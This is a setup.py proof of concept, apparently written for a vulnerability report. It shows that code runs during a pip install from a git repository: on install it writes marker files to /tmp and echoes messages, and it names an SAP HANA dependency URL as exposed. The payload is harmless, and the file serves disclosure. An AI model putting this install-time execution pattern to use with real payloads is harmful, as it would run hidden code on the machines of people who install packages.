# setup.py - The "can't miss it" POC
from setuptools import setup
import os

# Create MULTIPLE obvious files
files = [
    "/tmp/PIP_INSTALL_EXECUTED_CODE.txt",
    f"/tmp/POC_{os.getenv('USER', 'test')}_RCE.txt",
    "/tmp/🚨_SAP_VULNERABILITY_🚨.txt"
]

for filepath in files:
    with open(filepath, "w") as f:
        f.write(f"File: {filepath}\n")
        f.write("Created during: pip install git+https://github.com/TalhaKhan-404/test.git\n")
        f.write("This means: CODE EXECUTED = RCE POSSIBLE\n")
        f.write("\nSAP HANA vulnerable to same attack:\n")
        f.write("git+https://github.com/alundesap/python-jws.git/#egg=jws\n")

# Try to print to console via os.system (sometimes works)
os.system(f"echo '\n=== POC: Files created in /tmp ==='")
os.system(f"echo 'Check: ls -la /tmp/*POC* /tmp/🚨*'")

setup(name='obvious-poc', version='0.1.0')
